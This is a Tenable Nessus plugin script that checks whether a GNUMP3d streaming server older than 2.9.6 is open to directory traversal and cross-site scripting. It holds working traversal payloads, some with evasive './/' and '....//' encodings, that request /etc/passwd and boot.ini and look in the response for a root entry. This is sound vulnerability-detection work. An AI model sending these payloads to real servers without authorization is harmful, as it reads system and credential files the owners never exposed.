#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20110);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-3123", "CVE-2005-3424", "CVE-2005-3425");
  script_bugtraq_id(15226, 15228, 15341);
  script_osvdb_id(20359, 20360, 20723);

  script_name(english:"GNUMP3d < 2.9.6 Multiple Remote Vulnerabilities (XSS, Traversal)");
  script_summary(english:"Checks for multiple vulnerabilities in GNUMP3d < 2.9.6");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote streaming server is prone to directory traversal and cross-
site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GNUMP3d, an open source audio / video
streaming server. 

The installed version of GNUMP3d on the remote host fails to 
completely filter out directory traversal sequences from request URIs. 
By leveraging this flaw, an attacker can read arbitrary files on the
remote host subject to the privileges under which the server operates.  
In addition, it fails to sanitize user-supplied input to several 
scripts, which can be used to launch cross-site scripting attacks 
against the affected application." );
  # http://cvs.savannah.gnu.org/viewvc/gnump3d/gnump3d/ChangeLog?view=markup&content-type=text%2Fvnd.viewcvs-markup&revision=1.134 
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ee529de4" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GNUMP3d 2.9.7 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/10/31");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/10/28");
 script_cvs_date("$Date: 2016/05/16 13:53:26 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:gnump3d");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 3333, 8888);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:8888);


# Unless we're paranoid, make sure the banner looks like GNUMP3d.
if (report_paranoia < 2) {
  banner = get_http_banner(port:port);
  if (!banner || "Server: GNUMP3d " >!< banner) exit(0);
}


# Try to exploit the directory traversal flaw.
exploits = make_list(
  # should work up to 2.9.5 under Windows.
  "/..\..\..\..\..\..\..\..\..\boot.ini",
  # works in 2.9.3 under *nix.
  "/.//././/././/././/././/././/././/./etc/passwd",
  # should work in 2.9.1 - 2.9.2 under *nix, although apparently only if gnump3d's root directory is one level down from the root (eg, "/mp3s").
  "/....///....///....///....///....///....//....//....//etc/passwd",
  # should work w/ really old versions under *nix.
  urlencode(str:"/../../../../../../../etc/passwd")
);
foreach exploit (exploits) {
  r = http_send_recv3(method:"GET",item:exploit, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    if (report_verbosity > 0)
      security_warning(port:port, extra: res);
    else
      security_warning(port:port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
